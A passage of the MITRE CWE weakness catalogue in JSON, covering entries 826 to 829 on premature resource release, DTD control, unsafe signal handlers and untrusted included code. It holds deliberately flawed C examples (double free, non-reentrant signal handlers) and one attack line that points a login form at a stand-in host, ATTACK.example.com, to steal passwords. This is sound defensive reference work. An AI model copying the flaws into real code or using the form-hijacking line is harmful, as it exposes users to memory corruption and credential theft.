              "BodyText": "When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function."
            }
          ]
        },
        {
          "ID": "DX-72",
          "Entries": [
            {
              "IntroText": "The following code shows a simple example of a double free error:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar* ptr = (char*)malloc (SIZE);\n\t...\n\tif (abrt) {\n\t\tfree(ptr);\n\t}\n\t...\n\tfree(ptr);\n```"
            },
            {
              "BodyText": "Double free vulnerabilities have two common (and sometimes overlapping) causes:"
            },
            {
              "BodyText": "- Error conditions and other exceptional circumstances\n\n  - Confusion over which part of the program is responsible for freeing the memory"
            },
            {
              "BodyText": "Although some double free vulnerabilities are not much more complicated than the previous example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-5013",
          "Description": "access of expired memory address leads to arbitrary code execution",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5013"
        },
        {
          "Reference": "CVE-2010-3257",
          "Description": "stale pointer issue leads to denial of service and possibly other consequences",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3257"
        },
        {
          "Reference": "CVE-2008-0062",
          "Description": "Chain: a message having an unknown message type may cause a reference to uninitialized memory resulting in a null pointer dereference (CWE-476) or dangling pointer (CWE-825), possibly crashing the system or causing heap corruption.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0062"
        },
        {
          "Reference": "CVE-2007-1211",
          "Description": "read of value at an offset into a structure after the offset is no longer valid",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1211"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "There are close relationships between incorrect pointer dereferences and other weaknesses related to buffer operations. There may not be sufficient community agreement regarding these relationships. Further study is needed to determine when these relationships are chains, composites, perspective/layering, or other types of relationships. As of September 2010, most of the relationships are being captured as chains."
        },
        {
          "Type": "Terminology",
          "Note": "Many weaknesses related to pointer dereferences fall under the general term of \"memory corruption\" or \"memory safety.\" As of September 2010, there is no commonly-used terminology that covers the lower-level variants."
        }
      ]
    },
    {
      "ID": "826",
      "Name": "Premature Release of Resource During Expected Lifetime",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product releases a resource that is still intended to be used by itself or another actor.",
      "ExtendedDescription": "\n\nThis weakness focuses on errors in which the product should not release a resource, but performs the release anyway. This is different than a weakness in which the product releases a resource at the appropriate time, but it maintains a reference to the resource, which it later accesses. For this weakness, the resource should still be valid upon the subsequent access.\n\n\nWhen a product releases a resource that is still being used, it is possible that operations will still be taken on this resource, which may have been repurposed in the meantime, leading to issues similar to CWE-825. Consequences may include denial of service, information exposure, or code execution.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "666",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "672",
          "ViewID": "1000"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data",
            "Read Memory"
          ],
          "Note": "If the released resource is subsequently reused or reallocated, then a read operation on the original resource might access sensitive data that is associated with a different user or entity."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "When the resource is released, the software might modify some of its structure, or close associated channels (such as a file descriptor). When the software later accesses the resource as if it is valid, the resource might not be in an expected state, leading to resultant errors that may lead to a crash."
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Modify Application Data",
            "Modify Memory"
          ],
          "Note": "When the resource is released, the software might modify some of its structure. This might affect logic in the sections of code that still assume the resource is active. If the released resource is related to memory and is used in a function call, or points to unexpected data in a write operation, then code execution may be possible upon subsequent accesses."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-3547",
          "Description": "Chain: race condition (CWE-362) might allow resource to be released before operating on it, leading to NULL dereference (CWE-476)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3547"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "Under-studied and under-reported as of September 2010. This weakness has been reported in high-visibility software, although the focus has been primarily on memory allocation and de-allocation. There are very few examples of this weakness that are not directly related to memory management, although such weaknesses are likely to occur in real-world software for other types of resources."
        }
      ]
    },
    {
      "ID": "827",
      "Name": "Improper Control of Document Type Definition",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not restrict a reference to a Document Type Definition (DTD) to the intended control sphere. This might allow attackers to reference arbitrary DTDs, possibly causing the product to expose files, consume excessive system resources, or execute arbitrary http requests on behalf of the attacker.",
      "ExtendedDescription": "\n\nAs DTDs are processed, they might try to read or include files on the machine performing the parsing. If an attacker is able to control the DTD, then the attacker might be able to specify sensitive resources or requests or provide malicious content.\n\n\nFor example, the SOAP specification prohibits SOAP messages from containing DTDs.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "706",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "829",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "776",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "XML",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Files or Directories"
          ],
          "Note": "If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)",
            "DoS: Resource Consumption (Memory)"
          ],
          "Note": "The DTD may cause the parser to consume excessive CPU cycles or memory using techniques such as nested or recursive entity references (CWE-776)."
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability",
            "Access Control"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Gain Privileges or Assume Identity"
          ],
          "Note": "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2010-2076",
          "Description": "Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2076"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-773",
          "Authors": [
            "Daniel Kulp"
          ],
          "Title": "Apache CXF Security Advisory (CVE-2010-2076)",
          "PublicationYear": "2010",
          "PublicationMonth": "06",
          "PublicationDay": "16",
          "URL": "http://svn.apache.org/repos/asf/cxf/trunk/security/CVE-2010-2076.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "828",
      "Name": "Signal Handler with Functionality that is not Asynchronous-Safe",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product defines a signal handler that contains code sequences that are not asynchronous-safe, i.e., the functionality is not reentrant, or it can be interrupted.",
      "ExtendedDescription": "\n\nThis can lead to an unexpected system state with a variety of potential consequences depending on context, including denial of service and code execution.\n\n\nSignal handlers are typically intended to interrupt normal functionality of a program, or even other signals, in order to notify the process of an event. When a signal handler uses global or static variables, or invokes functions that ultimately depend on such state or its associated metadata, then it could corrupt system state that is being used by normal functionality. This could subject the program to race conditions or other weaknesses that allow an attacker to cause the program state to be corrupted. While denial of service is frequently the consequence, in some cases this weakness could be leveraged for code execution.\n\n\nThere are several different scenarios that introduce this issue:\n\n\n  - Invocation of non-reentrant functions from within the handler. One example is malloc(), which modifies internal global variables as it manages memory. Very few functions are actually reentrant.\n\n  - Code sequences (not necessarily function calls) contain non-atomic use of global variables, or associated metadata or structures, that can be accessed by other functionality of the program, including other signal handlers. Frequently, the same function is registered to handle multiple signals.\n\n  - The signal handler function is intended to run at most one time, but instead it can be invoked multiple times. This could happen by repeated delivery of the same signal, or by delivery of different signals that have the same handler function (CWE-831).\n\nNote that in some environments or contexts, it might be possible for the signal handler to be interrupted itself.\n\nIf both a signal handler and the normal behavior of the product have to operate on the same set of state variables, and a signal is received in the middle of the normal execution's modifications of those variables, the variables may be in an incorrect or corrupt state during signal handler execution, and possibly still incorrect or corrupt upon return.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "364",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "The most common consequence will be a corruption of the state of the product, possibly leading to a crash or exit. However, if the signal handler is operating on state variables for security relevant libraries or protection mechanisms, the consequences can be far more severe, including protection mechanism bypass, privilege escalation, or information exposure."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation",
            "Architecture and Design"
          ],
          "Description": "\n\nEliminate the usage of non-reentrant functionality inside of signal handlers. This includes replacing all non-reentrant library calls with reentrant calls.\n\n\nNote: This will not always be possible and may require large portions of the product to be rewritten or even redesigned. Sometimes reentrant-safe library alternatives will not be available. Sometimes non-reentrant interaction between the state of the system and the signal handler will be required by design.\n",
          "Effectiveness": "High"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Where non-reentrant functionality must be leveraged within a signal handler, be sure to block or mask signals appropriately. This includes blocking other signals within the signal handler itself that may also leverage the functionality. It also includes blocking all signals reliant upon the functionality when it is being accessed or modified by the normal behaviors of the product."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-26",
          "Entries": [
            {
              "IntroText": "This code registers the same signal handler function with two different signals (CWE-831). If those signals are sent to the process, the handler creates a log message (specified in the first argument to the program) and exits."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar *logMessage;\n\tvoid handler (int sigNum) {\n\t\t\tsyslog(LOG_NOTICE, \"%s\\n\", logMessage);\n\t\t\tfree(logMessage);\n```\n/* artificially increase the size of the timing window to make demonstration of this weakness easier. */* \n\t\t\t\n\t\t\tsleep(10);\n\t\t\texit(0);}\n\t\n\tint main (int argc, char* argv[]) {\n\t```\n\t\t\tlogMessage = strdup(argv[1]);\n```\n/* Register signal handlers. */* \n\t\t\t\n\t\t\tsignal(SIGHUP, handler);\n\t\t\tsignal(SIGTERM, handler);\n\t\t\t\n\t\t\t */* artificially increase the size of the timing window to make demonstration of this weakness easier. */* \n\t\t\t\n\t\t\tsleep(10);}"
            },
            {
              "BodyText": "The handler function uses global state (globalVar and logMessage), and it can be called by both the SIGHUP and SIGTERM signals. An attack scenario might follow these lines:"
            },
            {
              "BodyText": "- The program begins execution, initializes logMessage, and registers the signal handlers for SIGHUP and SIGTERM.\n\n  - The program begins its \"normal\" functionality, which is simplified as sleep(), but could be any functionality that consumes some time.\n\n  - The attacker sends SIGHUP, which invokes handler (call this \"SIGHUP-handler\").\n\n  - SIGHUP-handler begins to execute, calling syslog().\n\n  - syslog() calls malloc(), which is non-reentrant. malloc() begins to modify metadata to manage the heap.\n\n  - The attacker then sends SIGTERM.\n\n  - SIGHUP-handler is interrupted, but syslog's malloc call is still executing and has not finished modifying its metadata.\n\n  - The SIGTERM handler is invoked.\n\n  - SIGTERM-handler records the log message using syslog(), then frees the logMessage variable."
            },
            {
              "BodyText": "At this point, the state of the heap is uncertain, because malloc is still modifying the metadata for the heap; the metadata might be in an inconsistent state. The SIGTERM-handler call to free() is assuming that the metadata is inconsistent, possibly causing it to write data to the wrong location while managing the heap. The result is memory corruption, which could lead to a crash or even code execution, depending on the circumstances under which the code is running."
            },
            {
              "BodyText": "Note that this is an adaptation of a classic example as originally presented by Michal Zalewski [REF-360]; the original example was shown to be exploitable for code execution."
            },
            {
              "BodyText": "Also note that the strdup(argv[1]) call contains a potential buffer over-read (CWE-126) if the program is called without any arguments, because argc would be 0, and argv[1] would point outside the bounds of the array."
            }
          ]
        },
        {
          "ID": "DX-48",
          "Entries": [
            {
              "IntroText": "The following code registers a signal handler with multiple signals in order to log when a specific event occurs and to free associated memory before exiting."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#include <signal.h>\n\t#include <syslog.h>\n\t#include <string.h>\n\t#include <stdlib.h>\n\tvoid *global1, *global2;\n\tchar *what;\n\tvoid sh (int dummy) {\n\t\t\tsyslog(LOG_NOTICE,\"%s\\n\",what);\n\t\t\tfree(global2);\n\t\t\tfree(global1);\n```\n/* Sleep statements added to expand timing window for race condition */* \n\t\t\t\n\t\t\tsleep(10);\n\t\t\texit(0);}\n\t\n\tint main (int argc,char* argv[]) {\n\t```\n\t\t\twhat=argv[1];\n\t\t\tglobal1=strdup(argv[2]);\n\t\t\tglobal2=malloc(340);\n\t\t\tsignal(SIGHUP,sh);\n\t\t\tsignal(SIGTERM,sh);\n```\n/* Sleep statements added to expand timing window for race condition */* \n\t\t\t\n\t\t\tsleep(10);\n\t\t\texit(0);}"
            },
            {
              "BodyText": "However, the following sequence of events may result in a double-free (CWE-415):"
            },
            {
              "BodyText": "1. a SIGHUP is delivered to the process\n\n  1. sh() is invoked to process the SIGHUP\n\n  1. This first invocation of sh() reaches the point where global1 is freed\n\n  1. At this point, a SIGTERM is sent to the process\n\n  1. the second invocation of sh() might do another free of global1\n\n  1. this results in a double-free (CWE-415)"
            },
            {
              "BodyText": "This is just one possible exploitation of the above code. As another example, the syslog call may use malloc calls which are not async-signal safe. This could cause corruption of the heap management structures. For more details, consult the example within \"Delivering Signals for Fun and Profit\" [REF-360]."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-4109",
          "Description": "Signal handler uses functions that ultimately call the unsafe syslog/malloc/s*printf, leading to denial of service via multiple login attempts",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4109"
        },
        {
          "Reference": "CVE-2006-5051",
          "Description": "Chain: Signal handler contains too much functionality (CWE-828), introducing a race condition (CWE-362) that leads to a double free (CWE-415).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-5051"
        },
        {
          "Reference": "CVE-2001-1349",
          "Description": "unsafe calls to library functions from signal handler",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1349"
        },
        {
          "Reference": "CVE-2004-0794",
          "Description": "SIGURG can be used to remotely interrupt signal handler; other variants exist.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0794"
        },
        {
          "Reference": "CVE-2004-2259",
          "Description": "SIGCHLD signal to FTP server can cause crash under heavy load while executing non-reentrant functions like malloc/free.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2259"
        },
        {
          "Reference": "CVE-2002-1563",
          "Description": "SIGCHLD not blocked in a daemon loop while counter is modified, causing counter to get out of sync.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1563"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "SIG31-C",
          "EntryName": "Do not access or modify shared objects in signal handlers"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-360",
          "Authors": [
            "Michal Zalewski"
          ],
          "Title": "Delivering Signals for Fun and Profit",
          "URL": "https://lcamtuf.coredump.cx/signals.txt",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-361",
          "Title": "Race Condition: Signal Handling",
          "URL": "https://vulncat.fortify.com/en/detail?id=desc.structural.cpp.race_condition_signal_handling#:~:text=Signal%20handling%20race%20conditions%20can,installed%20to%20handle%20multiple%20signals.s",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "829",
      "Name": "Inclusion of Functionality from Untrusted Control Sphere",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.",
      "ExtendedDescription": "\n\nWhen including third-party functionality, such as a web widget, library, or other source of functionality, the product must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.\n\n\nThis might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601).\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "669",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "669",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "An attacker could insert malicious functionality into the program by causing the program to download code that the attacker has placed into the untrusted control sphere, such as a malicious web site."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tForced Path Execution\n\t\tMonitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAttack Modeling",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-4",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid."
        },
        {
          "MitigationID": "MIT-21.1",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Enforcement by Conversion",
          "Description": "\n\nWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.\n\n\nFor example, ID 1 could map to \"inbox.txt\" and ID 2 could map to \"profile.txt\". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.\n"
        },
        {
          "MitigationID": "MIT-15",
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."
        },
        {
          "MitigationID": "MIT-22",
          "Phase": [
            "Architecture and Design",
            "Operation"
          ],
          "Strategy": "Sandbox or Jail",
          "Description": "\n\nRun the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.\n\n\nOS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.\n\n\nThis may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.\n\n\nBe careful to avoid CWE-243 and other weaknesses related to jails.\n",
          "Effectiveness": "Limited",
          "EffectivenessNotes": "The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."
        },
        {
          "MitigationID": "MIT-17",
          "Phase": [
            "Architecture and Design",
            "Operation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."
        },
        {
          "MitigationID": "MIT-5.1",
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n\n\nWhen validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single \".\" character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as \"/\" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.\n\n\nDo not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering \"/\" is insufficient protection if the filesystem also supports the use of \"\\\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if \"../\" sequences are removed from the \".../...//\" string in a sequential fashion, two instances of \"../\" would be removed from the original string, but the remaining characters would still form the \"../\" string.\n",
          "Effectiveness": "High"
        },
        {
          "MitigationID": "MIT-34",
          "Phase": [
            "Architecture and Design",
            "Operation"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "\n\nStore library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.\n\n\nThis significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.\n"
        },
        {
          "MitigationID": "MIT-6",
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "\n\nUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.\n\n\nMany file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.\n"
        },
        {
          "MitigationID": "MIT-29",
          "Phase": [
            "Operation"
          ],
          "Strategy": "Firewall",
          "Description": "Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.",
          "Effectiveness": "Moderate",
          "EffectivenessNotes": "An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-94",
          "Entries": [
            {
              "IntroText": "This login webpage includes a weather widget from an external website:"
            },
            {
              "Nature": "Bad",
              "Language": "HTML",
              "ExampleCode": "```\n\t<div class=\"header\"> Welcome!\n\t\t<div id=\"loginBox\">Please Login:\n\t\t\t<form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\">\n\t\t\tUsername: <input type=\"text\" name=\"username\" />\n\t\t\t<br/>\n\t\t\tPassword: <input type=\"password\" name=\"password\" />\n\t\t\t<input type=\"submit\" value=\"Login\" />\n\t\t\t</form>\n\t\t</div>\n\t\t<div id=\"WeatherWidget\">\n\t\t\t<script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"></script>\n\t\t</div>\n\t</div>\n```"
            },
            {
              "BodyText": "This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79)."
            },
            {
              "BodyText": "For example, user login information could easily be stolen with a single line added to weatherwidget.js:"
            },
            {
              "Nature": "Attack",
              "Language": "JavaScript",
              "ExampleCode": "```\n```\n...Weather widget code....* \n\tdocument.getElementById('loginForm').action = \"ATTACK.example.com/stealPassword.php\";"
            },
            {
              "BodyText": "This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2010-2076",
          "Description": "Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2076"
        },
        {
          "Reference": "CVE-2004-0285",
          "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0285"
        },
        {
          "Reference": "CVE-2004-0030",
          "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0030"
        },
        {
          "Reference": "CVE-2004-0068",
          "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0068"
        },
        {
          "Reference": "CVE-2005-2157",
          "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2157"
        },
        {
          "Reference": "CVE-2005-2162",
          "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2162"
        },
        {
          "Reference": "CVE-2005-2198",
          "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2198"
        },
        {
          "Reference": "CVE-2004-0128",
          "Description": "Modification of assumed-immutable variable in configuration script leads to file inclusion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0128"
        },
        {
          "Reference": "CVE-2005-1864",
          "Description": "PHP file inclusion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1864"
        },
        {
          "Reference": "CVE-2005-1869",
          "Description": "PHP file inclusion.",
